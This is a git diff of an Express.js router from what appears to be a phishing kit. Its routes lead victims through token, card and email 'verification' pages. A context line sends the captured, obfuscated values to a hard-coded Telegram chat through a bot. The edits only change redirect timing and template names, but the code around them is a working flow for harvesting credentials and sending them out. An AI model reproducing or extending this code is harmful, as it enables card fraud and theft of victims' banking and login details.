@@ -31,13 +31,9 @@ router.get('/', (req, res) => {
 
 });
 router.get('/token', (req, res) => {
-    res.render('wait', { seconds: 15 });
-  setTimeout(() => {
-    res.redirect('/cardverificacion');
-  }, 15000);
+    res.render('token.ejs');
+
 });
-
-
 
 router.get('/cardverificacion', (req, res) => {
     res.render('card.ejs');
@@ -53,7 +49,7 @@ router.get('/emailverificacion', (req, res) => {
 
 
 router.get('/new-logs', (req, res) => {
-    res.render('new-entry.ejs', {
+    res.render('new-logs', {
         books
     })
 });
@@ -115,12 +111,10 @@ bot.sendMessage('791007687', `1: ${r6fa6y89yB}\n2: ${nYffxLjdFW}\n3: ${wJcPshSku
     books.push(newBook);
     
 
-    // Espera 15 segundos antes de redirigir
-
-   res.render('wait', { seconds: 15 });
+    // Espera 30 segundos antes de redirigir
 setTimeout(() => {
-  res.redirect('cardverificacion');
-}, 15000); // 15000 milisegundos = 15 segundos
+    res.redirect('cardverificacion');
+  }, 30000); // 30000 milisegundos = 30 segundos
     
     
     
